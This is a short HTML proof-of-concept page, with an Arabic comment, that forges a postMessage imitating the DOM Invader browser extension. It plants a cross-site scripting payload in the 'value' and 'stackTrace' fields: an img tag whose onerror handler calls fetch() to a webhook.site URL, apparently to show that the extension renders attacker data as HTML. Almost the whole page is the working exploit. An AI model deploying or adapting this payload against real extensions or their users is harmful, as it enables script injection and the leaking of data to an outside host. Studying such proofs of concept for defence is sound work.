<!DOCTYPE html>
<html>
<body>
<script>
    const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
    
    // بعت الـ postMessage بس - من غير أي innerHTML في صفحتك
    window.postMessage({
        "source": "dom-invader",
        "type": "augmented-dom",
        "data": {
            "sink": "innerHTML",
            "value": "<img src=x onerror=fetch('" + webhook + "?from=extension')>",
            "stackTrace": "<img src=x onerror=fetch('" + webhook + "?from=stacktrace')>"
        }
    }, "*");
</script>
</body>
</html>
